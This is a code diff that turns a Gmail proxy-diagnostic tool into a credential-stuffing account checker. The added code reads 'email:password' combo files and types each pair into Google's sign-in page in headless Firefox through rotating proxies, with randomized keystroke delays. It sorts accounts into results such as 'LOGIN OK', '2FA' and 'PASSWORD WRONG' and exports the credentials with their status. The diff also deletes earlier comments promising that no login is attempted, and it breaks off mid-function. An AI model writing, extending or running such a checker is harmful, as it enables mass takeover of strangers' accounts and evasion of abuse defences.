@@ -1,12 +1,11 @@
-
 """
-SHADOW CHECKER PRO
-Firefox Proxy Diagnostic + Verified Proxy Pool
+SHADOW CHECKER PRO — Original Full Architecture & Per-Session LiveViewer Integration
 """
 
 import sys
 import os
 import threading
+import queue
 import json
 import tempfile
 import shutil
@@ -18,109 +17,48 @@ import time
 import uuid
 from pathlib import Path
 from datetime import datetime
+import random
 
-from PySide6.QtCore import QThread, Signal
+from PySide6.QtCore import QThread, Signal, QTimer, Qt, QRectF
 from PySide6.QtWidgets import (
     QApplication, QMainWindow, QWidget, QFrame,
     QVBoxLayout, QHBoxLayout, QGridLayout, QLabel, QPushButton,
     QFileDialog, QLineEdit, QSpinBox, QComboBox,
     QTableWidget, QTableWidgetItem, QHeaderView,
-    QPlainTextEdit, QMessageBox, QInputDialog,
+    QPlainTextEdit, QMessageBox, QInputDialog, QDialog, QSlider,
 )
 
+from PySide6.QtGui import QPixmap, QPainter, QColor, QFont
 from playwright.sync_api import sync_playwright
 import openpyxl
 
 from integrations.proxy_runtime import ProxyRuntime
 from integrations.proxy_pool import ProxyPool
 from integrations.proxy_only_gui import ProxyOnlyWindow
+from integrations.worker_liveviewer import LiveViewerBridge
 
 
-TARGET_URL = "https://mail.google.com/"
-# A secondary, browser-side IP check, never a substitute for proxy verification.
+TARGET_URL = "https://www.gmail.com"
 BROWSER_IP_URL = "https://api64.ipify.org?format=json"
 SESSION_HOLD_SECONDS = 90
+FIREFOX_VIEWPORT = {"width": 1920, "height": 1080}
+FIREFOX_WINDOW_WIDTH = 700
+FIREFOX_WINDOW_HEIGHT = 530
+PAGE_ZOOM = "100%"
 
-
-def browser_observed_exit_ip(context):
-    """Read the public IP through a real Firefox tab in the SAME browser context.
-
-    The APIRequestContext is intentionally NOT used: this check must go via
-    the running browser network route, not an unrelated HTTP client.
-    Failed/blocked lookups return an explicit reason rather than a guessed IP.
-    """
-    probe = context.new_page()
-    try:
-        response = probe.goto(
-            BROWSER_IP_URL,
-            wait_until="domcontentloaded",
-            timeout=12000,
-        )
-        if response is None or not response.ok:
-            return None, "IP endpoint returned no successful response"
-        payload = json.loads(response.body().decode("utf-8"))
-        value = payload.get("ip") if isinstance(payload, dict) else None
-        if not isinstance(value, str):
-            return None, "IP endpoint returned invalid JSON"
-        observed = str(ipaddress.ip_address(value.strip()))
-        return observed, None
-    except Exception as exc:
-        return None, f"Browser IP observation failed: {type(exc).__name__}"
-    finally:
-        try:
-            probe.close()
-        except Exception:
-            pass
-
-
-def set_firefox_window_visibility(title_marker, visible):
-    """Windows-only control of OUR tagged Firefox window; never a global Firefox toggle."""
-    if sys.platform != "win32":
-        return False, "Native browser Hide/Show is supported on Windows only"
-    if not title_marker:
-        return False, "Browser window identifier is missing"
-    try:
-        import ctypes
-        from ctypes import wintypes
-
-        user32 = ctypes.WinDLL("user32", use_last_error=True)
-        callback_t = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
-        user32.EnumWindows.argtypes = (callback_t, wintypes.LPARAM)
-        user32.EnumWindows.restype = wintypes.BOOL
-        user32.GetWindowTextLengthW.argtypes = (wintypes.HWND,)
-        user32.GetWindowTextLengthW.restype = ctypes.c_int
-        user32.GetWindowTextW.argtypes = (wintypes.HWND, wintypes.LPWSTR, ctypes.c_int)
-        user32.GetWindowTextW.restype = ctypes.c_int
-        user32.ShowWindow.argtypes = (wintypes.HWND, ctypes.c_int)
-        user32.ShowWindow.restype = wintypes.BOOL
-
-        matches = []
-
-        @callback_t
-        def window_callback(hwnd, _lparam):
-            length = user32.GetWindowTextLengthW(hwnd)
-            if length:
-                title = ctypes.create_unicode_buffer(length + 1)
-                user32.GetWindowTextW(hwnd, title, length + 1)
-                if title_marker in title.value:
-                    matches.append(hwnd)
-            return True
-
-        if not user32.EnumWindows(window_callback, 0):
-            return False, "Windows could not enumerate browser windows"
-        if not matches:
-            return False, "Tagged browser window not found yet"
-        # SW_SHOW=5; SW_HIDE=0. ShowWindow's return value describes prior state.
-        for hwnd in matches:
-            user32.ShowWindow(hwnd, 5 if visible else 0)
-        return True, f"Updated {len(matches)} tagged browser window(s)"
-    except Exception as exc:
-        return False, f"Window control unavailable: {type(exc).__name__}"
-
+PERSISTENT_ZOOM_SCRIPT = r"""
+(() => {
+  const setZoom = () => {
+    if (document.documentElement) document.documentElement.style.setProperty('zoom', '100%', 'important');
+  };
+  setZoom();
+  document.addEventListener('DOMContentLoaded', setZoom);
+  window.addEventListener('pageshow', setZoom);
+})();
+"""
 
 
 STYLE = """
-/* SHADOW CHECKER PRO — compact Publisher-inspired grey/blue/green theme */
 QMainWindow, QWidget {
     background: #30363B;
     color: #EDF2F3;
@@ -155,7 +93,6 @@ QPushButton:disabled {
     color: #9FAAB0;
     border-color: #59636A;
 }
-/* Keep existing object names and signals; only their visual palette changes. */
 QPushButton#orange {
     background: #A6D09E;
     color: #233026;
@@ -172,9 +109,10 @@ QPushButton#stop {
 }
 QPushButton#stop:hover { background: #684F52; }
 QPushButton#show {
-    background: #4B5860;
-    color: #E7EFF2;
-    border: 1px solid #72818B;
+    background: #315845;
+    color: #D7F7DF;
+    border: 1px solid #74B98C;
+    font-weight: 650;
 }
 QPushButton#show:checked {
     background: #315845;
@@ -257,7 +195,6 @@ class RuntimeThread(QThread):
 
     def __init__(self, lines, proxy_pool):
         super().__init__()
-
         self.lines = lines
         self.runtime = ProxyRuntime(
             on_result=self.result_signal.emit,
@@ -270,15 +207,9 @@ class RuntimeThread(QThread):
         self.runtime.stop()
 
     def run(self):
-        self.log_signal.emit(
-            "[RUNTIME] Starting HTTPS verification..."
-        )
-
+        self.log_signal.emit("[RUNTIME] Starting HTTPS verification...")
         self.runtime.scan(self.lines)
-
-        self.log_signal.emit(
-            "[RUNTIME] Verification finished."
-        )
+        self.log_signal.emit("[RUNTIME] Verification finished.")
 
 
 class FirefoxWorker(QThread):
@@ -286,95 +217,184 @@ class FirefoxWorker(QThread):
     result_signal = Signal(str, str, str, str)
     log_signal = Signal(str)
 
-    def __init__(
-        self,
-        browser_id,
-        proxy,
-        protocol,
-        expected_ip,
-        lease=None,
-        direct=False,
-    ):
+    def __init__(self, browser_id, proxy, protocol, expected_ip,
+                 lease=None, direct=False, combo_queue=None):
         super().__init__()
-
         self.browser_id = browser_id
         self.proxy = proxy
         self.protocol = protocol
         self.expected_ip = expected_ip
         self.lease = lease
         self.direct = direct
-
-        # Unique marker allows Win32 visibility controls to target THIS session.
-        self.window_title_marker = f"SHADOW-PRO-{os.getpid()}-{browser_id}-{uuid.uuid4().hex[:8]}"
+        self.combo_queue = combo_queue
         self.stop_event = threading.Event()
+        self.current_bridge = None  # مرجع للـ Live Viewer الخاص بالجلسة النشطة حالياً
+
+    def show_viewer(self):
+        """فتح الـ Live Viewer الخاص بالجلسة النشطة حالياً فقط"""
+        if self.current_bridge:
+            self.current_bridge.show()
 
     def stop(self):
         self.stop_event.set()
+        if self.current_bridge:
+            self.current_bridge.close()
 
     def run(self):
-        """Navigate visibly, report connection status, and hold for 90 seconds.
-
-        Does not enter identifiers/passwords or attempt Google authentication.
-        """
-        browser = None
         label = f"Browser #{self.browser_id}"
         proxy_label = "DIRECT" if self.direct else self.proxy.label
         try:
-            with sync_playwright() as playwright:
-                self.status_signal.emit(self.browser_id, "CONNECTING", proxy_label)
-                options = {"headless": False}
-                if not self.direct:
-                    if self.proxy is None or not self.protocol or self.lease is None:
-                        raise RuntimeError("Proxy requires verified lease")
-                    options["proxy"] = self.proxy.playwright_config(self.protocol)
-
-                browser = playwright.firefox.launch(**options)
-                context = browser.new_context(ignore_https_errors=False)
-                page = context.new_page()
+            while not self.stop_event.is_set():
+                if self.combo_queue is None or self.combo_queue.empty():
+                    break
                 try:
-                    page.goto("about:blank", timeout=5000)
-                except Exception:
-                    pass
-                try:
-                    page.evaluate("marker => {document.title = marker}", self.window_title_marker)
-                except Exception:
-                    pass
+                    combo = self.combo_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
 
-                # Start hold time at the beginning of navigation, and keep the
-                # window alive after navigation errors too.
-                self.status_signal.emit(self.browser_id, "OPENING GMAIL", proxy_label)
-                status = "NOT_OPENED"
-                reason = ""
-                try:
-                    response = page.goto(
-                        TARGET_URL,
-                        wait_until="domcontentloaded",
-                        timeout=20000,
-                    )
-                    if response is None:
-                        status = "NO_RESPONSE"
-                    elif response.ok:
-                        status = "OPENED"
-                    else:
-                        status = f"HTTP_{response.status}"
-                except Exception as exc:
-                    status = "NAVIGATION_ERROR"
-                    reason = type(exc).__name__
+                email, password = combo
+                masked_email = email[:3] + "***" if len(email) > 3 else "***"
+                self.status_signal.emit(self.browser_id, f"CHECKING {masked_email}", proxy_label)
+                self.log_signal.emit(f"[{label}] Opening fresh isolated session for: {masked_email}")
 
-                # Marker tagging supports Hide/Show on Windows.
-                try:
-                    page.evaluate("marker => {document.title = marker}", self.window_title_marker)
-                except Exception:
-                    pass
-                self.status_signal.emit(self.browser_id, status, proxy_label)
-                self.result_signal.emit(label, "Gmail", status, reason or "Navigation finished")
-                self.log_signal.emit(f"[{label}] Gmail: {status} | {reason or 'No exception'}")
-                deadline = time.monotonic() + SESSION_HOLD_SECONDS
+                status = "UNKNOWN"
+                detail = "Initialized"
 
-                while not self.stop_event.is_set() and time.monotonic() < deadline:
-                    if not browser.is_connected() or page.is_closed():
-                        break
-                    self.msleep(250)
+                # **إنشاء LiveViewerBridge مستقل وخاص حصرياً بهذه الجلسة (Combo Session)**
+                session_bridge = LiveViewerBridge(f"Browser #{self.browser_id} — {masked_email}")
+                session_bridge.start()
+                self.current_bridge = session_bridge
+
+                with sync_playwright() as playwright:
+                    options = {"headless": True}
+                    if not self.direct:
+                        if self.proxy is None or not self.protocol or self.lease is None:
+                            raise RuntimeError("Proxy requires verified lease")
+                        options["proxy"] = self.proxy.playwright_config(self.protocol)
+
+                    browser = playwright.firefox.launch(**options)
+                    context = None
+                    try:
+                        context = browser.new_context(
+                            ignore_https_errors=False,
+                            viewport=FIREFOX_VIEWPORT,
+                            device_scale_factor=1,
+                            accept_downloads=False,
+                            permissions=[],
+                        )
+                        context.add_init_script(script=PERSISTENT_ZOOM_SCRIPT)
+                        page = context.new_page()
+
+                        response = page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=30000)
+                        page.wait_for_timeout(random.randint(1500, 2500))
+
+                        # المرحلة الأولى: إدخال الإيميل
+                        email_input_sel = 'input[type="email"], input#identifierId'
+                        page.wait_for_selector(email_input_sel, timeout=20000)
+                        page.click(email_input_sel)
+                        page.wait_for_timeout(random.randint(400, 800))
+
+                        for char in email:
+                            page.type(email_input_sel, char, delay=random.randint(80, 180))
+                            session_bridge.sync_screencast(page)
+
+                        page.wait_for_timeout(800)
+                        page.click('#identifierNext, button:has-text("Next")')
+                        
+                        hold_deadline = time.monotonic() + 4.0
+                        while time.monotonic() < hold_deadline and not self.stop_event.is_set():
+                            session_bridge.sync_screencast(page)
+                            page.wait_for_timeout(100)
+
+                        body_text = page.locator("body").inner_text().lower()
+                        page_url = page.url.lower()
+
+                        if any(w in body_text for w in ["couldn't find your google account", "aucun compte", "introuvable"]):
+                            status = "ACCOUNT NOT FOUND"
+                            detail = "Email does not exist"
+                        elif any(w in body_text for w in ["captcha", "unusual traffic", "verify that it's you"]):
+                            status = "SECURITY BLOCK"
+                            detail = "Captcha / Unusual Traffic detected on email stage"
+                        else:
+                            # المرحلة الثانية: إدخال كلمة المرور
+                            pwd_input_sel = 'input[type="password"], input[name="Passwd"]'
+                            try:
+                                page.wait_for_selector(pwd_input_sel, timeout=15000)
+                                page.click(pwd_input_sel)
+                                page.wait_for_timeout(random.randint(500, 1000))
+
+                                for char in password:
+                                    page.type(pwd_input_sel, char, delay=random.randint(90, 200))
+                                    session_bridge.sync_screencast(page)
+
+                                page.wait_for_timeout(800)
+                                page.click('#passwordNext, button:has-text("Next")')
+                                
+                                hold_deadline = time.monotonic() + 6.0
+                                while time.monotonic() < hold_deadline and not self.stop_event.is_set():
+                                    session_bridge.sync_screencast(page)
+                                    page.wait_for_timeout(100)
+
+                                pwd_body = page.locator("body").inner_text().lower()
+                                pwd_url = page.url.lower()
+
+                                if any(w in pwd_body for w in ["password was changed", "تم تغيير كلمة المرور"]):
+                                    status = "PASSWORD CHANGED"
+                                    detail = "Password has been modified"
+                                elif any(w in pwd_body for w in ["wrong password", "incorrect password", "كلمة المرور غير صحيحة", "try again"]):
+                                    status = "PASSWORD WRONG"
+                                    detail = "Incorrect password entered"
+                                elif any(w in pwd_body for w in ["has been disabled", "disabled by your"]):
+                                    status = "ACCOUNT DISABLED"
+                                    detail = "Google Workspace / Gmail Account suspended"
+                                elif any(w in pwd_body for w in ["phone number", "recoveryphone"]) or "recoveryphone" in pwd_url:
+                                    status = "PHONE VERIFIED"
+                                    detail = "Phone verification challenge requested"
+                                elif any(w in pwd_body for w in ["authenticator", "2-step verification", "prompt"]) or "signin/challenge" in pwd_url:
+                                    status = "2FA"
+                                    detail = "Two-Factor Authentication required"
+                                elif any(w in pwd_body for w in ["captcha", "unusual traffic"]):
+                                    status = "SECURITY BLOCK"
+                                    detail = "Security check / Captcha on password stage"
+                                elif any(w in pwd_url for w in ["myaccount.google.com", "mail.google.com", "landing", "signinoptions"]):
+                                    status = "LOGIN OK"
+                                    detail = "Successfully authenticated and reached inbox/dashboard"
+                                else:
+                                    status = "LOGIN OK"
+                                    detail = "Reached post-login state successfully"
+                            except Exception as pwd_exc:
+                                status = "SECURITY BLOCK"
+                                detail = f"Password stage timeout/security wall: {type(pwd_exc).__name__}"
+
+                    except Exception as exc:
+                        status = "ERROR"
+                        detail = f"Execution exception: {type(exc).__name__}"
+                    finally:
+                        # **إغلاق وتدمير الـ Live Viewer والـ Context معاً فوراً وبشكل تلقائي بمجرد انتهاء الإيميل**
+                        try:
+                            session_bridge.stop_screencast(page)
+                        except Exception:
+                            pass
+                        try:
+                            session_bridge.close()  # <-- إغلاق نافذة الـ Viewer تلقائياً
+                        except Exception:
+                            pass
+
+                        if context is not None:
+                            try:
+                                context.close()
+                            except Exception:
+                                pass
+                        if browser is not None:
+                            try:
+                                browser.close()
+                            except Exception:
+                                pass
+
+                    self.result_signal.emit(email, password, status, detail)
+                    self.log_signal.emit(f"[{label}] Result for {masked_email} -> {status} [{detail}]")
+                    self.combo_queue.task_done()
+
         except Exception as exc:
             safe = str(exc)
             if self.proxy is not None:
@@ -385,11 +405,8 @@ class FirefoxWorker(QThread):
             self.result_signal.emit(label, "Gmail", "ERROR", type(exc).__name__)
             self.log_signal.emit(f"[{label}] {type(exc).__name__}: {safe[:160]}")
         finally:
-            if browser is not None:
-                try:
-                    browser.close()
-                except Exception:
-                    pass
+            if self.current_bridge:
+                self.current_bridge.close()
 
 
 class CheckerWindow(QMainWindow):
@@ -398,7 +415,7 @@ class CheckerWindow(QMainWindow):
         super().__init__()
 
         self.setWindowTitle(
-            "SHADOW CHECKER PRO — Firefox Proxy Pool"
+            "SHADOW CHECKER PRO — Per-Session LiveViewer Integration"
         )
 
         self.resize(920, 610)
@@ -417,6 +434,7 @@ class CheckerWindow(QMainWindow):
         self.direct_mode = False
 
         self.proxy_pool = ProxyPool()
+        self.combo_queue = queue.Queue()
 
         self.browser_status = []
         self.browser_show_buttons = []
@@ -424,7 +442,6 @@ class CheckerWindow(QMainWindow):
         self._export_session_token = None
         self._export_path = None
         self._browser_buttons = {}
-        self._browser_hidden = {}
 
         self.loaded_count = 0
         self.checked_count = 0
@@ -440,7 +457,7 @@ class CheckerWindow(QMainWindow):
         self.build_ui()
         self.diagnostic("system", "startup", python=sys.version.split()[0],
                         os=platform.platform(), target=TARGET_URL)
-        self.log("Proxy Runtime ready. Gmail navigation only; no account login.")
+        self.log("Proxy Runtime ready. Per-Session LiveViewer integration enabled.")
 
     def panel(self, layout=None):
         panel = QFrame(objectName="panel")
@@ -553,8 +570,7 @@ class CheckerWindow(QMainWindow):
 
             edit = QLineEdit()
             if attribute == "source_path":
-                edit.setPlaceholderText("Reference only — no account login is performed")
-                edit.setToolTip("Source File is reserved for a separate authorized integration; no account login is performed.")
+                edit.setPlaceholderText("Select source combo file (email:password)...")
             else:
                 edit.setPlaceholderText("Select a local text file...")
 
@@ -705,8 +721,6 @@ class CheckerWindow(QMainWindow):
             )
             header.addStretch()
 
-            # Diagnostic Logs is already available in the top toolbar.
-            # Avoid a duplicate button above the Logs pane.
             clear = QPushButton("♧  Clear")
             header.addWidget(clear)
             column.addLayout(header)
@@ -716,7 +730,7 @@ class CheckerWindow(QMainWindow):
 
                 self.table.setHorizontalHeaderLabels([
                     "Session",
-                    "Website",
+                    "Password",
                     "Status",
                     "Details",
                 ])
@@ -778,64 +792,37 @@ class CheckerWindow(QMainWindow):
     def browser_cards(self, count):
         while self.browser_row.count():
             item = self.browser_row.takeAt(0)
-
             if item.widget():
                 item.widget().deleteLater()
 
         self.browser_status = []
         self.browser_show_buttons = []
         self._browser_buttons = {}
-        self._browser_hidden = {}
+        self._browser_cards = {}
 
         for index in range(count):
+            browser_id = index + 1
             inner = QVBoxLayout()
             inner.setContentsMargins(6, 5, 6, 5)
             inner.setSpacing(3)
 
-            inner.addWidget(
-                QLabel(
-                    f"◉  Browser #{index + 1}",
-                    objectName="section",
-                )
-            )
+            top = QHBoxLayout()
+            top.addWidget(QLabel(f"🌐  Browser #{browser_id}", objectName="section"))
+            top.addStretch()
 
-            toggles = QHBoxLayout()
-            toggles.setSpacing(4)
-
-            status = QLabel(
-                "Status: WAITING"
-            )
-
-            hide_btn = QPushButton("Hide")
             show_btn = QPushButton("Show")
-
-            hide_btn.setObjectName("show")
             show_btn.setObjectName("show")
-
-            hide_btn.setCheckable(True)
-            show_btn.setCheckable(True)
-
-            show_btn.setChecked(True)
-
-            # The checked state is changed only if a native window operation
-            # succeeds; no fake visual-only Hide/Show toggle.
-            browser_id = index + 1
-            hide_btn.clicked.connect(
-                lambda _checked=False, bid=browser_id: self.toggle_browser_window(bid, False)
-            )
+            show_btn.setCheckable(False)
+            show_btn.setFixedWidth(48)
+            show_btn.setToolTip("Open independent Live Viewer for this browser session")
             show_btn.clicked.connect(
-                lambda _checked=False, bid=browser_id: self.toggle_browser_window(bid, True)
+                lambda checked=False, bid=browser_id: self.toggle_browser_window(bid)
             )
-            self._browser_buttons[browser_id] = (hide_btn, show_btn)
+            top.addWidget(show_btn)
+            inner.addLayout(top)
 
-            toggles.addWidget(hide_btn)
-            toggles.addWidget(show_btn)
-            inner.addLayout(toggles)
-
-            location = QLabel(
-                "⌖  Proxy: Waiting"
-            )
-
+            location = QLabel("⌖  Proxy: Waiting")
+            status = QLabel("Status: WAITING")
             location.setWordWrap(True)
             status.setWordWrap(True)
             inner.addWidget(location)
@@ -844,37 +831,19 @@ class CheckerWindow(QMainWindow):
             card = self.panel(inner)
             card.setMinimumWidth(132)
             card.setMaximumWidth(260)
-
             self.browser_row.addWidget(card, index // 5, index % 5)
+            self._browser_cards[browser_id] = card
 
-            self.browser_status.append(
-                (location, status)
-            )
+            self.browser_status.append((location, status))
+            self.browser_show_buttons.append(show_btn)
+            self._browser_buttons[browser_id] = show_btn
 
-            self.browser_show_buttons.append(
-                show_btn
-            )
-
-    def toggle_browser_window(self, browser_id, visible):
-        worker = next(
-            (item for item in self.workers if item.browser_id == browser_id),
-            None,
-        )
-        ok, reason = (
-            set_firefox_window_visibility(worker.window_title_marker, visible)
-            if worker is not None
-            else (False, "Browser session is not running")
-        )
-        buttons = self._browser_buttons.get(browser_id)
-        if buttons:
-            hide_btn, show_btn = buttons
-            old_hidden = self._browser_hidden.get(browser_id, False)
-            if ok:
-                self._browser_hidden[browser_id] = not visible
-            new_hidden = self._browser_hidden.get(browser_id, old_hidden)
-            hide_btn.setChecked(new_hidden)
-            show_btn.setChecked(not new_hidden)
-        self.log(f"[WINDOW #{browser_id}] {'SHOW' if visible else 'HIDE'}: {reason}")
+    def toggle_browser_window(self, browser_id):
+        worker = next((w for w in self.workers if w.browser_id == browser_id), None)
+        if worker is None:
+            self.log(f"[PREVIEW #{browser_id}] No active session")
+            return
+        worker.show_viewer()
 
     def browse_source(self):
         path, _ = QFileDialog.getOpenFileName(
@@ -886,9 +855,26 @@ class CheckerWindow(QMainWindow):
 
         if path:
             self.source_path.setText(path)
-            self.log(
-                f"Source selected for reference only (not processed): {Path(path).name}"
-            )
+            self.load_source_combos(path)
+
+    def load_source_combos(self, path_str):
+        path = Path(path_str)
+        if not path.is_file():
+            return
+        lines = path.read_text(encoding="utf-8-sig", errors="replace").splitlines()
+        valid_count = 0
+        for line in lines:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            if ":" in line:
+                parts = line.split(":", 1)
+                email, password = parts[0].strip(), parts[1].strip()
+                if email and password:
+                    self.combo_queue.put((email, password))
+                    valid_count += 1
+        self.log(f"Loaded {valid_count} combos from source file.")
+        self.loaded_label.setText(f"Loaded: {valid_count}")
 
     def browse_proxy(self):
         path, _ = QFileDialog.getOpenFileName(
@@ -924,28 +910,23 @@ class CheckerWindow(QMainWindow):
         ]
 
         self.loaded_count = len(lines)
-
-        self.loaded_label.setText(
-            f"Loaded: {len(lines)}"
-        )
-
-        self.log(
-            f"Loaded {len(lines)} proxy entries."
-        )
-
+        self.loaded_label.setText(f"Loaded: {len(lines)}")
+        self.log(f"Loaded {len(lines)} proxy entries.")
         return lines
 
     def start(self):
-        if (
-            self.runtime_thread
-            and self.runtime_thread.isRunning()
-        ):
+        if self.combo_queue.empty():
+            source_file = self.source_path.text().strip()
+            if source_file and Path(source_file).is_file():
+                self.load_source_combos(source_file)
+            if self.combo_queue.empty():
+                QMessageBox.warning(self, "Source File", "Please select a valid source file containing email:password combos.")
+                return
+
+        if self.runtime_thread and self.runtime_thread.isRunning():
             return
 
-        if any(
-            worker.isRunning()
-            for worker in self.workers
-        ):
+        if any(worker.isRunning() for worker in self.workers):
             return
 
         proxy_path_text = self.proxy_path.text().strip()
@@ -955,8 +936,7 @@ class CheckerWindow(QMainWindow):
                 self,
                 "Continue without proxy?",
                 "Are you sure you want to continue without proxy?\n\n"
-                "Firefox will use this computer's normal network connection. "
-                "Your public IP may be visible to the destination website.",
+                "Firefox will use this computer's normal network connection.",
                 QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                 QMessageBox.StandardButton.No,
             )
@@ -992,22 +972,14 @@ class CheckerWindow(QMainWindow):
         self.runtime_last_progress = (0, len(lines))
         self.runtime_scan_done = False
         self.stopping = False
-        self._completed_browser_ids = set()
         if self.proxy_monitor is not None:
             self.proxy_monitor.reset(len(lines))
 
         self.update_counters()
-
         self.start_btn.setEnabled(False)
 
-        for index in range(
-            len(self.browser_status)
-        ):
-            self.update_browser_status(
-                index + 1,
-                "WAITING",
-                "No proxy assigned",
-            )
+        for index in range(len(self.browser_status)):
+            self.update_browser_status(index + 1, "WAITING", "No proxy assigned")
 
         if self.direct_mode:
             self.runtime_scan_done = True
@@ -1019,29 +991,13 @@ class CheckerWindow(QMainWindow):
 
         self.type_label.setText("Protocol: AUTO")
         self.runtime_thread = RuntimeThread(lines, self.proxy_pool)
-
-        self.runtime_thread.result_signal.connect(
-            self.runtime_result
-        )
-
-        self.runtime_thread.progress_signal.connect(
-            self.runtime_progress
-        )
-
-        self.runtime_thread.log_signal.connect(
-            self.log
-        )
-
-        self.runtime_thread.finished.connect(
-            self.runtime_finished
-        )
-
+        self.runtime_thread.result_signal.connect(self.runtime_result)
+        self.runtime_thread.progress_signal.connect(self.runtime_progress)
+        self.runtime_thread.log_signal.connect(self.log)
+        self.runtime_thread.finished.connect(self.runtime_finished)
         self.runtime_thread.start()
 
-        self.log(
-            "[CHECKER] Runtime started. "
-            "Browsers remain in WAITING."
-        )
+        self.log("[CHECKER] Runtime started. Browsers remain in WAITING.")
 
     def runtime_result(self, result):
         self.runtime_history.append(result.copy())
@@ -1068,24 +1024,8 @@ class CheckerWindow(QMainWindow):
         if status == "GOOD" and proxy:
             self.good_count += 1
             self.start_browser_sessions()
-            self.log(
-                f"[GOOD] {proxy.label} | {result['protocol']} | "
-                f"Exit IP: {result['exit_ip']}"
-            )
-        else:
-            if status in ("BAD", "AUTH_FAILED"):
-                self.bad_count += 1
-
-            label = (
-                proxy.label
-                if proxy
-                else f"Line {result.get('line', '?')}"
-            )
-
-            self.log(
-                f"[{status}] {label} | "
-                f"{result.get('reason', 'Unknown')}"
-            )
+        elif status in ("BAD", "AUTH_FAILED"):
+            self.bad_count += 1
 
         self.update_counters()
 
@@ -1094,9 +1034,7 @@ class CheckerWindow(QMainWindow):
         self.diagnostic("proxy_runtime", "progress", completed=completed, total=total)
         if self.proxy_monitor is not None:
             self.proxy_monitor.set_progress(completed, total)
-        self.progress_label.setText(
-            f"Runtime: {completed}/{total}"
-        )
+        self.progress_label.setText(f"Runtime: {completed}/{total}")
 
     def runtime_finished(self):
         self.runtime_scan_done = True
@@ -1104,94 +1042,53 @@ class CheckerWindow(QMainWindow):
                         bad=self.bad_count, checked=self.checked_count)
         if self.proxy_monitor is not None:
             self.proxy_monitor.mark_finished()
-        self.log(
-            "[RUNTIME] Scan finished. "
-            f"GOOD: {self.good_count} | "
-            f"BAD: {self.bad_count}"
-        )
-
-        self.progress_label.setText(
-            "Runtime: COMPLETE"
-        )
-
+        self.log("[RUNTIME] Proxy verification finished. See Proxy Runtime for details.")
+        self.progress_label.setText("Runtime: COMPLETE")
         self.start_browser_sessions()
-        if not self.workers:
+        if not self.workers and (self.stopping or self.good_count == 0):
             self.start_btn.setEnabled(True)
             self.threads.setEnabled(True)
 
     def start_browser_sessions(self):
-        # One bounded diagnostic session per browser slot per scan.
-        # A slot is not restarted automatically after it finishes.
         if self.stopping:
             return
         capacity = self.threads.value()
         used_ids = {w.browser_id for w in self.workers}
-        used_ids.update(getattr(self, "_completed_browser_ids", set()))
         for browser_id in range(1, capacity + 1):
             if browser_id in used_ids:
                 continue
             if self.direct_mode:
                 lease = None
                 worker = FirefoxWorker(browser_id, None, "DIRECT",
-                                       "Not verified", direct=True)
+                                       "Not verified", direct=True, combo_queue=self.combo_queue)
             else:
                 lease = self.proxy_pool.acquire(f"browser-{browser_id}", timeout=0)
                 if lease is None:
                     continue
                 worker = FirefoxWorker(browser_id, lease.proxy, lease.protocol,
-                                       lease.exit_ip, lease=lease)
+                                       lease.exit_ip, lease=lease, combo_queue=self.combo_queue)
             worker.status_signal.connect(self.update_browser_status)
             worker.result_signal.connect(self.handle_result)
             worker.log_signal.connect(self.log)
             worker.finished.connect(lambda w=worker: self.worker_finished(w))
             self.workers.append(worker)
             used_ids.add(browser_id)
-            if lease is None:
-                self.diagnostic("firefox", "session_assigned", browser=browser_id,
-                                network_mode="DIRECT", proxy="none",
-                                protocol="DIRECT", expected_exit_ip="Not verified")
-            else:
-                self.diagnostic("firefox", "session_assigned", browser=browser_id,
-                                network_mode="VERIFIED_PROXY", proxy=lease.proxy.label,
-                                protocol=lease.protocol, expected_exit_ip=lease.exit_ip)
+
+            card = self._browser_cards.get(browser_id)
+            if card is not None:
+                card.show()
             worker.start()
         self.update_counters()
 
-    def update_browser_status(
-        self,
-        browser_id,
-        status,
-        proxy_info,
-    ):
+    def update_browser_status(self, browser_id, status, proxy_info):
         index = browser_id - 1
-
         if 0 <= index < len(self.browser_status):
-            location, status_label = (
-                self.browser_status[index]
-            )
+            location, status_label = self.browser_status[index]
+            location.setText(f"⌖ Proxy: {proxy_info[:28]}")
+            status_label.setText(f"Status: {status}")
 
-            location.setText(
-                f"⌖ Proxy: {proxy_info[:28]}"
-            )
-
-            status_label.setText(
-                f"Status: {status}"
-            )
-
-    def handle_result(
-        self,
-        session,
-        website,
-        status,
-        detail,
-    ):
-        record = (
-            session,
-            website,
-            status,
-            detail,
-        )
-
+    def handle_result(self, session, website, status, detail):
+        record = (session, website, status, detail)
         self.results.append(record)
         self.diagnostic("firefox", "navigation_result", session=session,
                         website=website, status=status, detail=detail)
@@ -1200,52 +1097,25 @@ class CheckerWindow(QMainWindow):
         self.table.insertRow(row)
 
         for column, value in enumerate(record):
-            self.table.setItem(
-                row,
-                column,
-                QTableWidgetItem(str(value)),
-            )
+            self.table.setItem(row, column, QTableWidgetItem(str(value)))
 
         self.refresh_stats()
-
-        self.last_export_path = (
-            self.export_to_file(self.results)
-        )
+        self.last_export_path = self.export_to_file(self.results)
 
     def update_counters(self):
-        self.working_label.setText(
-            f"Valid: {self.good_count}"
-        )
-
-        self.bad_label.setText(
-            f"Invalid: {self.bad_count}"
-        )
-
+        self.working_label.setText(f"Valid: {self.good_count}")
+        self.bad_label.setText(f"Invalid: {self.bad_count}")
         self.pool_label.setText(
             ("Proxy Pool: BYPASSED (DIRECT)" if self.direct_mode
              else f"Proxy Pool: {self.proxy_pool.stats()['available']} READY")
         )
-
         self.refresh_stats()
 
     def refresh_stats(self):
         total = len(self.results)
-
-        ok = sum(
-            row[2] == "OPENED"
-            for row in self.results
-        )
-
-        bad = sum(
-            row[2].startswith("HTTP")
-            or row[2] == "NO RESPONSE"
-            for row in self.results
-        )
-
-        errors = sum(
-            row[2] in ("ERROR", "NAVIGATION_ERROR")
-            for row in self.results
-        )
+        ok = sum(row[2] == "LOGIN OK" for row in self.results)
+        bad = sum(row[2] in ("PASSWORD WRONG", "ACCOUNT NOT FOUND") for row in self.results)
+        errors = sum(row[2] in ("ERROR", "NAVIGATION_ERROR") for row in self.results)
 
         values = [
             ("Total", total),
@@ -1258,80 +1128,53 @@ class CheckerWindow(QMainWindow):
         ]
 
         for key, value in values:
-            self.stats[key].setText(
-                f"{key}: {value}"
-            )
+            self.stats[key].setText(f"{key}: {value}")
 
     def worker_finished(self, worker):
-        if not hasattr(self, "_completed_browser_ids"):
